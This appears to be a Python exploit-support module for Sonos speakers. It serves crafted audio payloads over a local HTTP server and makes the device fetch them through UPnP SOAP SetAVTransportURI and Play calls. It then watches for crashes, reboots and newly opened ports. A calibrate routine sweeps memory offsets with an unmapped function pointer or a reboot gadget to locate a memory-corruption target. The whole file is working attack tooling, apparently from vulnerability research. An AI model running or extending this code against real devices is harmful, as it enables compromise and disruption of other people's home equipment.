#!/usr/bin/env python3
"""The proven fire/calibrate/watch routines, extracted verbatim from the 2026-11-06
session runners (sweepshell/sweepdb/diagfire). Stdlib only. Every device-touching
function takes an explicit device IP."""
import subprocess, threading, http.server, socketserver, os, time, re, urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(_HERE, "..", "sweep2")

SVC = "urn:schemas-upnp-org:service:AVTransport:1"
PROTO = "http-get:*:audio/aac:*"   # default; protocol_info() prefers the device's own Sink list
# 2026-11-20: the PI is build-specific and matters. 57.23 lists `audible` and answers Play 200
# immediately with it; 86.10/86.11 do not list audible and need `aac`/`mpeg` + Play retries.
_PROTO_CACHE = {}


def protocol_info(device, timeout=6):
    """Pick a media type from the device's own ConnectionManager Sink list.

    Ordered by how reliably the build accepts `Play` with it: audible (S1) > aac > mpeg.
    Falls back to the default when the SCPD cannot be read."""
    if device in _PROTO_CACHE:
        return _PROTO_CACHE[device]
    body = ('<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>'
            '<u:GetProtocolInfo xmlns:u="urn:schemas-upnp-org:service:ConnectionManager:1"/>'
            '</s:Body></s:Envelope>')
    r = subprocess.run(["curl", "-s", "-m", str(timeout), "-X", "POST", "-H",
                        'Content-Type: text/xml; charset="utf-8"', "-H",
                        'SOAPACTION: "urn:schemas-upnp-org:service:ConnectionManager:1#GetProtocolInfo"',
                        "--data-binary", body, f"http://{device}:1400/MediaRenderer/ConnectionManager/Control"],
                       capture_output=True, text=True).stdout
    m = re.search(r"<Sink>(.*?)</Sink>", r, re.S)
    _PROTO_CACHE[device] = pick_protocol(m.group(1) if m else "")
    return _PROTO_CACHE[device]


def pick_protocol(sink):
    """Ordered by how reliably the build accepts Play: audible is an S1-only sink and starts
    instantly there; the S2 builds do not list it and need aac/mpeg (2026-11-20, measured)."""
    for name in ("audio/audible", "audio/aac", "audio/mpeg"):
        if name in sink:
            return f"http-get:*:{name}:*"
    return PROTO


def local_host(device):
    """The Mac address inside the device's own /24, on a real Ethernet interface.

    The players only fetch reliably from their own subnet (2026-11-20), and they do **not** follow
    a freshly added alias either: 192.168.4.200 was set on en0 and the unit fetched nothing until the
    long-established 192.168.4.160 was used. So: env override, then a proven address, then the first
    match on an `en*` interface (never utun/bridge/awdl)."""
    env = os.environ.get("SONOS_EXPLOIT_HOST")
    if env:
        return env
    dev = ".".join(device.split(".")[:3]) + "."
    cands, iface = [], None
    for line in subprocess.run(["ifconfig"], capture_output=True, text=True).stdout.splitlines():
        m = re.match(r"^([a-z0-9]+):", line)
        if m:
            iface = m.group(1)
            continue
        a = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
        if a and a.group(1).startswith(dev) and iface and iface.startswith("en"):
            cands.append(a.group(1))
    for proven in ("192.168.4.160", "192.168.5.160", "192.168.6.160"):
        if proven in cands:
            return proven
    return cands[0] if cands else "192.168.4.160"

def _server(host, port, payload_dir):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            p = os.path.join(payload_dir, self.path.split("?")[0].lstrip("/"))
            data = open(p, "rb").read() if os.path.exists(p) else b"x"
            self.send_response(200); self.send_header("Content-Length", str(len(data)))
            self.end_headers(); self.wfile.write(data)
        def log_message(self, fmt, *a):
            try:
                with open("/tmp/sonos-exploit-server.log", "a") as fh:
                    fh.write(time.strftime("%H:%M:%S ") + (fmt % a) + "\n")
            except Exception:
                pass
    socketserver.TCPServer.allow_reuse_address = True
    t = threading.Thread(target=lambda: socketserver.TCPServer((host, port), H).serve_forever(), daemon=True)
    t.start(); return t

def soap(device, action, extra="", ctl_path="/MediaRenderer/AVTransport/Control", timeout=15):
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            f'<u:{action} xmlns:u="{SVC}"><InstanceID>0</InstanceID>{extra}</u:{action}></s:Body></s:Envelope>')
    r = subprocess.run(["curl","-s","-m",str(timeout),"-X","POST",
                        "-H",'Content-Type: text/xml; charset="utf-8"',
                        "-H",f'SOAPACTION: "{SVC}#{action}"',"--data-binary",body,
                        f"http://{device}:1400{ctl_path}"], capture_output=True, text=True)
    m = re.search(r"errorCode>(\d+)<", r.stdout)
    return f"ERR{m.group(1)}" if m else "200"

def _didl(url, proto=None):
    return ('&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
            'xmlns:dc="http://purl.org/dc/elements/1.1/" '
            'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;'
            '&lt;item id="-1" parentID="-1" restricted="true"&gt;&lt;dc:title&gt;t&lt;/dc:title&gt;'
            '&lt;upnp:class&gt;object.item.audioItem.musicTrack&lt;/upnp:class&gt;'
            f'&lt;res protocolInfo="{proto or PROTO}"&gt;{url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;')

def alive(device, timeout=1.5):
    """/status/zp, not VERSION: VERSION goes empty for minutes after a payload fire on 57.23."""
    for path in ("status/zp", "status/VERSION"):
        try:
            return urllib.request.urlopen(f"http://{device}:1400/{path}", timeout=timeout).status == 200
        except Exception:
            continue
    return False


def daemon_up(device, timeout=1):
    """Liveness of the *daemon* rather than of the HTTP status server: 1410 is anacapad's own
    watchdog socket (1410 open on 57.23-83121 while /setstring no longer kills the daemon, so the
    status server can outlive a crash and every /status-based oracle is suspect)."""
    r = subprocess.run(["nc", "-z", "-G", str(timeout), device, "1410"], capture_output=True)
    return r.returncode == 0


def play_until(device, tries=6, pause=0.6):
    """Play is a race on the current builds: 701 until the renderer has opened the stream.
    Retry until it accepts; a fire is only armed once Play returns 200 (2026-11-20)."""
    code = "ERR000"
    for _ in range(tries):
        code = soap(device, "Play", "<Speed>1</Speed>")
        if code == "200":
            return code
        time.sleep(pause)
    return code

def port_open(device, port):
    r = subprocess.run(["nc","-z","-G","3",device,str(port)], capture_output=True, text=True)
    return r.returncode == 0

def icmp_ok(device):
    r = subprocess.run(["ping","-c","1","-W","1000",device], capture_output=True, text=True)
    return " 0% packet loss" in r.stdout

def fire_and_watch(device, payload_name, S, host=None, port=8981,
                   payload_dir=PAYLOAD_DIR, ports=(), watch_s=100, log=print):
    """Two-stage fire: benign stage1 + payload, then watch ports + ICMP/HTTP."""
    host = host or local_host(device)
    proto = protocol_info(device)
    _server(host, port, payload_dir)
    soap(device, "Stop")
    stage1 = f"http://{host}:{port}/A_toc_past_eof.aa"
    c1 = soap(device, "SetAVTransportURI",
              f"<CurrentURI>{stage1}</CurrentURI><CurrentURIMetaData>{_didl(stage1, proto)}</CurrentURIMetaData>")
    p1 = play_until(device)
    url = f"http://{host}:{port}/{payload_name}"
    c2 = soap(device, "SetAVTransportURI",
              f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{_didl(url, proto)}</CurrentURIMetaData>")
    p2 = play_until(device)
    log(f"fired {payload_name} at {S:06x} proto={proto} (s1={c1}/play={p1} s2={c2}/play={p2})")
    t0 = time.time(); losses = 0; max_down = 0; down = 0; opened = {}
    while time.time() - t0 < watch_s:
        time.sleep(1)
        if alive(device): down = 0
        else: down += 1; max_down = max(max_down, down)
        if not icmp_ok(device): losses += 1
        for p in ports:
            if p not in opened and port_open(device, p):
                opened[p] = round(time.time() - t0, 1)
                log(f"PORT {p} OPEN after {opened[p]}s")
    verdict = ("REBOOT" if losses >= 20 else "crash" if max_down >= 2 else "clean")
    log(f"watch done: icmp_losses={losses} max_http_down={max_down}s ports={opened} verdict={verdict}")
    return verdict, opened

def calibrate(device, lo=0x700000, hi=0x71c000, step=0x400, host=None,
              port=8982, payload_dir=PAYLOAD_DIR, fn=0x51000000, log=print,
              watch=6.0, settle=0.0, daemon_oracle=False):
    """Band sweep. FN=0x51000000 (unmapped) => daemon crash; FN=<reboot gadget> => box reboot.
    A fire is only armed once Play returns 200 (the 2026-11-20 race)."""
    from sonos_exploit import build
    host = host or local_host(device)
    proto = protocol_info(device)
    _server(host, port, payload_dir)
    soap(device, "Stop")
    for S in range(lo, hi, step):
        name = f"CAL_{S:06x}.aa"
        with open(os.path.join(payload_dir, name), "wb") as f:
            f.write(build(S, fn))
        st = f"http://{host}:{port}/A_toc_past_eof.aa"
        soap(device, "SetAVTransportURI",
              f"<CurrentURI>{st}</CurrentURI><CurrentURIMetaData>{_didl(st, proto)}</CurrentURIMetaData>")
        play_until(device)
        if settle:
            time.sleep(settle)
        url = f"http://{host}:{port}/{name}"
        c2 = soap(device, "SetAVTransportURI",
                  f"<CurrentURI>{url}</CurrentURI><CurrentURIMetaData>{_didl(url, proto)}</CurrentURIMetaData>")
        play_until(device)
        down = 0; maxd = 0; t0 = time.time()
        while time.time() - t0 < watch:
            time.sleep(0.2)
            up = daemon_up(device) if daemon_oracle else alive(device, 0.8)
            if not up:
                down += 1; maxd = max(maxd, down)
            else:
                if down >= 3: break
                down = 0
        # A reboot looks exactly like "still down when the window ends" — and reading BootSeq
        # while down yields -1, so a naive b1>b0 misses every reboot (the 2026-11-20 lesson).
        rebooting = (down >= watch * 0.8)
        if rebooting:
            for _ in range(120):
                time.sleep(1)
                if daemon_up(device) or alive(device, 1):
                    break
        log(f"sweep {S:06x}: outage_polls={down} max={maxd}{' REBOOT' if rebooting else ''}")
        if rebooting:
            return S
        if maxd >= 3:
            for _ in range(45):
                time.sleep(2)
                if alive(device): break
            return S
    return None
